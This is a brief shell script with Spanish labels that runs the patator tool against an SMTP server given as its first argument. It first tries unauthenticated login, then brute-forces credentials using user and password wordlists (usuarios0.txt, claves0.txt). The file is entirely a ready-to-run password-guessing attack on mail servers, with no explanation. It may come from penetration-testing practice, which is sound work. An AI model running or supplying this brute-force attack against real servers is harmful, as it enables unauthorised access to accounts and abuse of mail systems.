echo 
echo
echo "smtp sin autenticacion"
patator smtp_login host=$1
echo
echo "Fuerza bruta smtp con patator"
patator smtp_login  host=$1 inputs='FILE0\nFILE1' 0=usuarios0.txt 1=claves0.txt
